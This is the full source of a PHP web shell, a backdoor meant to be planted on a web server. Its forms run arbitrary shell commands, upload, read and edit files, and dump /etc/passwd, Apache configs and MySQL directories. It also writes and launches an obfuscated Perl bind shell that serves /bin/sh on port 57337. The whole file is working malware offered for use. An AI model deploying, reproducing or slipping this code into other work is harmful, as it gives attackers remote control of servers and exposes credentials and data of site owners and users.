<?
error_reporting(0);
################################
#   PHP SHELL http-based-terminal     #
#  by PHP SHELL                  #
################################
?>
<?$dir=realpath("./")."/";
$dir=str_replace("\\","/",$dir);
?>
<?
$dirfile="$file_to_download";
if (file_exists("$dirfile"))
{
header("location: $dirfile");
}
?>
<title>PHP SHELL http-based-terminal - <? echo $dir?></title>
<!-- PHP SHELL http-based-terminal - DANGEROUS GHOST` -->
<style>
BODY {
margin-top: 1px;
margin-right: 1px;
margin-bottom: 1px;
margin-left: 1px;
}
input {
font-family: Verdana;
font-size: 10px;
color: black;
background-color: #335F92;
border: solid 2px;
border-color: black
}
textarea {
color: black;
background-color: #335F92;
border: solid 2px;
border-color: black
}
select {
background-color: #335F92;
font: 10px verdana;
}
A:link {color:white;
text-decoration: none
}
A:visited { color:white;
text-decoration: none
}
A:active {color:white;
text-decoration: none
}
A:hover {color:red;
text-decoration: none
}
</style>
<center>
<table bgcolor=black cellspacing=1 width=100%><tr><td>
<table bgcolor=#363d4e width=100%>
<tr><td><center><b>
<font size=-2 face=verdana color=red>n57http-based Terminal<br>
<table width=100% heigth=0 cellpadding=0 cellspacing=0>
<tr><td>
</font>
<font size=-2 face=verdana color=white>
<form method=post>
<font color=white>
<b>::Exec command::</b><br>
<input name=exec size=50% value='<?echo"$exec";?>'><br>
<input name=dirname size=50% value='<?
if ($dirname == "") {print "/tmp/";}
else {
echo"$dirname";}?>'>
<?if($dirname !== "") { chdir($dirname);}?><br>
<input type=submit value="..Exec.. ">
</form>
<form enctype="multipart/form-data" method=post>
<b>::File upload::</b><br>
<input name=userfile type=file size=50%><br>
<input name=dirname size=50% value='<?
if ($dirname == "") {print "/tmp/";}
else {
echo"$dirname";}?>'><Br>
<input name=submit type=submit value=" Upload">
</form>
<form method=post>
<b>::Encode to md5,base64,Des::</b><br>
<input name='chack' value='<?echo"$chack"?>' size=31><br>
<?
if ($chack == "");
   else {
   echo "<font size=-2 face=verdana color=white><b>- $chack -</b></font><br>";
   echo "<font size=-2 face=verdana color=white><b><u>MD5:</u></b> "; echo md5("$chack"); echo "<br></font>";
   echo "<font size=-2 face=verdana color=white><b><u>Encode base64:</u></b> "; echo base64_encode("$chack"); echo "<br></font>";
   echo "<font size=-2 face=verdana color=white><b><u>Decode base64:</u></b> "; echo base64_decode("$chack"); echo "<br></font>";
   echo "<font size=-2 face=verdana color=white><b><u>DES:</u></b> "; echo crypt("$chack"); echo "<br></font>";
   }
?>
</form>


</td><td valign=top><div align=right>
<font size=-2 face=verdana color=white>
<form method=post>
<br><b>::Fast CMD::<Br></b><select size="1" name="runcmd">
<option value='1'>Find *-rw-* files</option>
<option value='2'>Find all config files</option>
<option value='3'>ps aux</option>
<option value='4'>cat /etc/passwd</option>
<option value='5'>cat /etc/httpd/conf/httpd.conf</option>
<option value='6'>cat &lt;dir&gt;/conf/httpd.conf</option>
<option value='7'>ls -la /var/lib/mysql/</option>
<option value='8'>netstat -a</option>
<option value='9'>perl --help</option>
<option value='10'>gcc --help</option>
<option value='11'>tar --help</option>
<option selected>o...Select command...o</option>
</select><br>
<input type=submit value='...Exec...'></form>
<form method=post>
<b>::Edit/Create file::<br></b> <input name=editfile value='<?
if ($dirname == "") {print "/tmp/file.txt";}
else {
echo"$dirname$editfile";}?>'>
</form>
<form method=post>
<b>::Download file::<Br></b>
<input name='file_to_download' value='<?
if ($dirname == "") {print "/tmp/file.txt";}
else {
echo "$dirname","file.txt";}?>'><br>
<input type=submit value=Download>
</form>
</div>
</td></tr></table>
<div align=left><font size=-2 face=verdana color=white>
<table border=1 width=100%><tr><td>
<font size=-2 face=verdana color=white>
<b>Kernel: </b>
<? passthru("uname -a");?>
<br>
<b>ID: </b>
<? passthru("id");?><br>
<b>Dir:</b> <? echo getcwd();?></div></td><td valign=top width=190><div align=right>
<font size=-2 face=verdana color=white>
<form method=post>
If SafeMode is On, then use this:
<input name=phpdir size=34 value='<?
if ($phpdir == "") {print "/Directory";}
else {
echo"$phpdir";}?>'>
</form>

<? ######## perl shell #########
$perlshell = "
#!/usr/bin/perl
use Socket;
#rintf \"BS9n\";
#lush();
+port= 57337;
+proto= getprotobyname(\'tcp\');
+cmd= \"lpd\";
+system= \'echo \"(`whoami`@`uname -n`:`pwd`)\"; /bin/sh\';
+0 = +cmd;
socket(SERVER, PF_INET, SOCK_STREAM, +proto) or die \"socket:$!\";
setsockopt(SERVER, SOL_SOCKET, SO_REUSEADDR, pack(\"l\", 1)) or die \"setsockopt: $!\";
bind(SERVER, sockaddr_in(+port, INADDR_ANY)) or die \"bind: +!\";
listen(SERVER, SOMAXCONN)or die \"listen: +!\";
for(; +paddr = accept(CLIENT, SERVER); close CLIENT)
{
open(STDIN, \">&CLIENT\");
open(STDOUT, \">&CLIENT\");
open(STDERR, \">&CLIENT\");
system(+system);
close(STDIN);
close(STDOUT);
close(STDERR);
}

";
############# C++ shell #########
$cshell = "

";

?>

</div></td></tr></table>
</td></tr>
<font size=-2 face=verdana color=white><B>Backdoor directory: &nbsp;<?echo $dir?></b>
<tr><td>
<? if($editfile == ""); else {echo '
<form method=post>
<textarea name=editpost cols=70 rows=20>';
$filename = "$editfile";
$fd = fopen ($filename, "r");
$out = fread ($fd, filesize ($filename));
fclose ($fd);
echo "$out";
echo '</textarea><br>
<input name=editfile size=100% value=';echo $editfile;echo'>
<input type=submit value=-Edit-><br>
';
if ($editpost == ""); else {
$editpost = str_replace("\\","",$editpost);
$fp = fopen($editfile, w);
fwrite($fp,"$editpost");
print "<center><font size=-2 face=verdana color=green><b>File <u>$editfile</u> edited/created success!</b></font><br></center>";
print "<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana color=white><center>:: PHPshell.org http-based-terminal ::</a>";
print "</td></tr></table></td></tr></table>";exit;
}
;}
?>
<textarea name=terminal cols=121 rows=20>
<?
if($fileperl == "nst.pl") {
        $perlshell = str_replace("+","$",$perlshell);
        $perlshell = str_replace("\\","",$perlshell);
        $perlshell = str_replace("9","\\",$perlshell);
        $nst = fopen("/tmp/nst.pl", w);
        fwrite($nst, "$perlshell");
        exec("perl /tmp/nst.pl");
        echo "If perl exist, and no firewall on serv (etc), then you will got shell on port 57337";
        }

?>
<?
if (($phpdir == "") or ($phpdir == "/Directory"));
else {
$dh = opendir($phpdir) or die("couldn't open directory");
while (!(($file = readdir($dh)) === false)) {
if (is_dir("$phpdir/$file")) {
print "\n[D] : ";
}
print "$file\n";
}
closedir($dh);}
?>
<?
### 4tobi dobavit kamandu, to dabavte jejo tut i smatrite vi6e
### tam gde <option>
if($runcmd == "1") {passthru("find / -type f -perm -04000 -ls");}
if($runcmd == "2") {passthru("locate config");}
if($runcmd == "3") {passthru("ps aux");}
if($runcmd == "4") {passthru("cat /etc/passwd");}
if($runcmd == "5") {passthru("cat /etc/httpd/conf/httpd.conf");}
if($runcmd == "6") {passthru("cat /usr/local/apache/conf/httpd.conf");}
if($runcmd == "7") {passthru("ls -la /var/lib/mysql");}
if($runcmd == "8") {passthru("netstat -a");}
if($runcmd == "9") {passthru("perl --help");}
if($runcmd == "10") {passthru("gcc --help");}
if($runcmd == "11") {passthru("tar --help");}
#if($runcmd == "12") {passthru("");}
#if($runcmd == "13") {passthru("");}
# etc..
?>
<?
if (isset($submit)){
copy($userfile,$dirname.$userfile_name);
if (!is_uploaded_file ($userfile)){
echo "$userfile_name can't upload";
}
}
if (is_uploaded_file ($userfile)){
echo "Uploaded to: $dirname$userfile_name\n\n";
}
?>
<?
if (($exec == "") or ($exec == "ls -la")) {print passthru("ls -la");}
else
passthru($exec);
?>
</textarea>
<table width=100% heigth=0 cellpadding=0 cellspacing=0><tr><td valign=top><form method=post>
<font size=-2 face=verdana color=white>
<b>Run backdoor on port 57337
<input type=hidden name=fileperl value='nst.pl'>
<input type=submit value='Open'><br>[Perl] </b>
</form></td><td valign=top><div align=right>
<!-- <form method=post> -->
<b><input type=submit value='Open'>
<font size=-2 face=verdana color=white>
<!-- <input type=hidden name=filec value='nst.c'> -->
Run backdoor on port 57338<br></b>Soon <b>[C++]<sub></sub></b>
<!-- </form> --> </div></td></tr></table>
<? echo "<a href=http://www.PHPshell.org target=_blank><font size=-2 face=verdana><center>PHPshell.org http-based-terminal v1.0 </a>";?>
</td></tr></table></td></tr></table>';
?>
